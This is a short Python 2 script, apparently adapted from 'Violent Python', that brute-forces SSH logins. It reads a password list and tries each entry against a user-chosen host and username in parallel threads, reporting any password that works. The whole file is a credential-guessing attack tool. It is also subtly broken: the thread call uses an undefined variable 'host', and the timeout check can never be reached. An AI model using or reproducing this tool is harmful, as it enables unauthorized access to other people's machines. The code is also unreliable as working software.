#
#
# SSH brutforce cracker, based on project from 'Violent Python'
# by TJ O'Connor
#

from pexpect import pxssh
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)

Found = False
Fails = 0

def conn(host, user, password, release):

    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print "Password found !!!: " + password

        Found = True

    except Exception, e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            conn(host, user, password, False)

        elif 'synchronize with original prompt' in str(e):
            time.sleep(5)
            conn(host, user, password, False)

    finally:
        if release: connection_lock.release()

def main():

    target_host = raw_input("Specify target host: ")
    password_file = raw_input("Specify password_file: ")
    user = raw_input("Specify user: ")

    if target_host == None or password_file == None or user == None:
        print "Please provide password file, target host and username"
        exit(0)

    fn = open(password_file, 'r')

    for line in fn.readlines():

        if Found:
            print "Password Found !!! Exiting..."
            exit(0)
            if Fails > 5:
                print "Too many socket timeouts. Exiting..."
                exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[---] Testing: " + str(password)

        t = Thread(target = conn, args = (host, user, password, True))
        child = t.start()
